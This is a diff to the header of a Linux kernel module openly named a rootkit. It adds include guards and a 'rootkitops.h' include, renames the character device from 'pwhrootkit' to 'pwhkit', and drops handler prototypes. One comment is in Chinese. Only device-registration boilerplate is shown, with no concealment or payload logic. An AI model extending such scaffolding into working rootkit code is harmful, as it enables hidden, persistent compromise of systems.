@@ -1,12 +1,17 @@
+#ifndef PWHROOTKIT_H
+#define PWHROOTKIT_H
+
 #include <linux/module.h>
 #include <linux/init.h>
 #include <linux/kernel.h>
 #include <linux/fs.h>
 #include <linux/device.h>
+#include "rootkitops.h"
 
-#define DEVICE_NAME "pwhrootkit"
-#define DEVICE_PATH "/dev/pwhrootkit"
-#define CLASS_NAME "pwhrootkit"
+#define DEVICE_NAME "pwhkit"
+#define DEVICE_PATH "/dev/pwhkit"
+#define CLASS_NAME "pwhkit"
+
 
 static int major_num;
 static int erro_code;
@@ -15,11 +20,6 @@ static struct device *module_device = NULL;
 static struct file * __file = NULL;
 static struct inode * __inode = NULL;
 
-static ssize_t pwh_rootkit_read(struct file *, char __user *, size_t, loff_t *);
-static ssize_t pwh_rootkit_write(struct file *, const char __user *, size_t, loff_t *);
-static long pwh_rootkit_ioctl(struct file *, unsigned int, unsigned long);
-static int pwh_rootkit_open(struct inode *, struct file *);
-static int pwh_rootkit_release(struct inode *, struct file *);
 
 static struct file_operations pwh_rootkit_fops = {
     .owner = THIS_MODULE,   //这里是内核中实现的一个宏,标示出编译阶段生成的与当前内核模块关联的struct module结构体的地址
@@ -30,6 +30,6 @@ static struct file_operations pwh_rootkit_fops = {
     .unlocked_ioctl = pwh_rootkit_ioctl,
 };
 
-
+#endif
 
 
